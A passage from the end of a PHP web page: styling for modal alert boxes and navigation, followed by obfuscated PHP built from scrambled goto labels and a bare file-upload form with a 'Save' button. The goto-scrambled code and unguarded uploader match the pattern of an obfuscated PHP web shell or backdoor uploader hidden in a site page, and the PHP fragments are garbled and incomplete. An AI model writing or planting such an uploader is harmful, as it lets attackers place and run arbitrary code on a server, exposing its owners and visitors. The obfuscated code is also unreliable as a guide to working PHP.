	border: 1px solid #666;
	background-color: #fff;
	background-repeat: no-repeat;
	background-position: 20px 30px;
}

#modalContainer>#alertBox {
	position: fixed;
}

#alertBox h1 {
	margin: 0;
	font: bold 0.9em verdana, arial;
	background-color: #3073BB;
	color: #FFF;
	border-bottom: 1px solid #000;
	padding: 2px 0 2px 5px;
}

#alertBox p {
	color: red;
	height: 50px;
	padding-left: 5px;
	margin-left: 55px;
}

#alertBox #closeBtn {
	display: block;
	position: relative;
	margin: 5px auto;
	padding: 7px;
	border: 0 none;
	width: 70px;
	font: 0.7em verdana, arial;
	text-transform: uppercase;
	text-align: center;
	color: #FFF;
	background-color: #357EBD;
	border-radius: 3px;
	text-decoration: none;
}


/* unrelated styles */

#mContainer {
	position: relative;
	width: 600px;
	margin: auto;
	padding: 5px;
	border-top: 2px solid #000;
	border-bottom: 2px solid #000;
	font: 0.7em verdana, arial;
}

h1,
h2 {
	margin: 0;
	padding: 4px;
	font: bold 1.5em verdana;
	border-bottom: 1px solid #000;
}

code {
	font-size: 1.2em;
	color: #069;
}

#credits {
	position: relative;
	margin: 25px auto 0px auto;
	width: 350px;
	font: 0.7em verdana;
	border-top: 1px solid #000;
	border-bottom: 1px solid #000;
	height: 90px;
	padding-top: 4px;
}

#credits img {
	float: left;
	margin: 5px 10px 5px 0px;
	border: 1px solid #000000;
	width: 80px;
	height: 79px;
}

.important {
	background-color: #F5FCC8;
	padding: 2px;
}

.main {
	width: 100%;
	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px rgba(48, 48, 48, 0.7);
}

.vn-nav ul {
	margin: 0;
	padding: 0;
	list-style-type: none;
	list-style-image: none;
}

.vn-nav li {
	margin-right: 0px;
	display: inline;
}

.vn-nav ul li a {
	text-decoration: none;
	margin: 0px;
	padding: 15px 20px 15px 20px;
	color: #ffffff;
}

.vn-nav li.current-menu-item a {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.vn-nav li.current_page_item {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.modalDialog {
	position: fixed;
	font-weight: bold;
	font-family: 'Agency FB';
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgba(0, 0, 0, 0.8);
	z-index: 99999;
	opacity: 0;
	-webkit-transition: opacity 400ms ease-in;
	-moz-transition: opacity 400ms ease-in;
	transition: opacity 400ms ease-in;
	pointer-events: none;
}

.modalDialog:target {
	opacity: 1;
	pointer-events: auto;
}

.modalDialog>div {
	width: 500px;
	height: auto;
	position: relative;
	margin: 5% auto;
	padding: 5px 20px 13px 20px;
	background: #34495e;
	color: #fff;
}

.close {
	background: #2c3e50;
	color: #16a085;
	padding: 5px;
	position: right;
	right: -55px;
	text-align: center;
	top: 0;
	width: auto;
	float: left;
	text-decoration: none;
	font-weight: bold;
}

.close:hover {
	background: #2c3e50;
	color: #e74c3c
}

.vn-green a {
	background: #27ae60;
	padding: 10px;
	color: #fff;
}

.vn-green a:hover {
	color: red;
	background: #21894d;
	text-decoration: none;
}
</style>
<script type="text/javascript">alert(<?php  goto ONmgf;
     terM6: ?>);</script>
<?php  goto lgIu4;
     lgIu4:
 } goto acC90; qkhAz: CJNkO: goto nYmSZ; bM1qs: Guyes: goto Dn0ba; Y4e5u: ?>
	<form method="post" enctype="multipart/form-data">
		<center>
			<input class="btn" type="file" name="file" />
			<input class="btn btn-danger" name="upl" type="submit" value="Save">
		</center>
	</form>
</body>
</html>